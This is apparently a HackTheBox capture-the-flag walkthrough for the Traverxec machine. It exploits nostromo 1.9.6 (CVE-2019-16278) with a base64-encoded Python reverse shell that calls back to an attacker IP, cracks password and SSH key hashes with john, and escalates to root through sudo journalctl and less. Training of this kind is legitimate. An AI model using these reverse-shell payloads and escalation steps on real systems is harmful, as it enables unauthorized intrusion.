# Traverxec HackTheBox

![image](https://user-images.githubusercontent.com/5285547/124390855-611f6100-dce5-11eb-9e04-504177808d60.png)


## Nmap 

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
```

What's nostromo 1.9.6? I've not seen that before. 
Let's check it out. 

## www-data 

Finding an exploit online and checking it out, seems a socket is used to connect back to the server, nice!

Exploit: https://www.exploit-db.com/exploits/47837

```
 python2.7 cve2019_16278.py 10.10.10.165 80 id
```

![image](https://user-images.githubusercontent.com/5285547/124392012-510a8000-dceb-11eb-98b7-078c1895ce3c.png)

Nice, time for a reverse shell. 

## Payload

python3
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.15",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

- Then base64 encoded
- Then urlencoded (all charaters)


- Final payload & command
```
python2.7 cve2019_16278.py 10.10.10.165 80 "echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE2LjE1Iiw5OTk5KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7b3MuZHVwMihzLmZpbGVubygpLDIpO2ltcG9ydCBwdHk7IHB0eS5zcGF3bigiYmFzaCIpJw%3D%3D|base64 -d|bash"
```

![image](https://user-images.githubusercontent.com/5285547/124392273-7a77db80-dcec-11eb-991f-d8bb03df01b4.png)


We're on the box
Using linpeas.sh to enumerate I find david's hash, craking time 2!

![image](https://user-images.githubusercontent.com/5285547/124392503-d8f18980-dced-11eb-9ed4-921b7abde379.png)


```
~/src/john/run/./john hash -w=/usr/share/SecLists/Passwords/rockyou.txt
(I'm using linux mint, adjust to your needs for kali, parrot etc)
```

![image](https://user-images.githubusercontent.com/5285547/124392492-c8d9aa00-dced-11eb-90ce-bc6619bcf4c8.png)

Enumerating the conf files gave away some juicy info realtead to where server paths are defined

```
cat nhttpd.conf 
# MAIN [MANDATORY]

servername		traverxec.htb
serverlisten		*
serveradmin		david@traverxec.htb
serverroot		/var/nostromo
servermimes		conf/mimes
docroot			/var/nostromo/htdocs
docindex		index.html

# LOGS [OPTIONAL]

logpid			logs/nhttpd.pid

# SETUID [RECOMMENDED]

user			www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess		.htaccess
htpasswd		/var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons			/var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs		/home
homedirs_public		public_www
```

In the /home/david/public_www folder we can find a backup file

![image](https://user-images.githubusercontent.com/5285547/124393531-d7769000-dcf2-11eb-8b94-b40961993b44.png)

Moving the backup file to the tmp file i extracted the data

```
tar -xvf backup-ssh-identity-files.tgz
```

![image](https://user-images.githubusercontent.com/5285547/124393598-14db1d80-dcf3-11eb-9c28-f6179112c44c.png)

Now with the id_rsa key I can use ssh2john to crack the id_rsa, then get onto the box as David.

```
./ssh2john id_rsa > hash
john hash wordlist
```

![image](https://user-images.githubusercontent.com/5285547/124393704-a9de1680-dcf3-11eb-9327-f9082bcaf77d.png)


```
ssh david@10.10.10.165 -i id_rsa
Nowonly4me
```

Result!

![image](https://user-images.githubusercontent.com/5285547/124393778-fa557400-dcf3-11eb-8cfa-2246c8d2e698.png)


## Root

In Davids home folder is a bash script showing a command we can run as root with no password

```
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
```

Running the last line gives us sudo execution, not time to find out how to exploit journalctl
Seeing that -n means the last five lines, if we make the termainl smaller then 5 lines we should be bumped into the less command as root

![image](https://user-images.githubusercontent.com/5285547/124394236-8a94b880-dcf6-11eb-935f-f5f95139647d.png)

```
!/bin/sh

# id
uid=0(root) gid=0(root) groups=0(root)
# cd /root
# ls;hostname
nostromo_1.9.6-1.deb  root.txt
traverxec
```

And get the root flag!



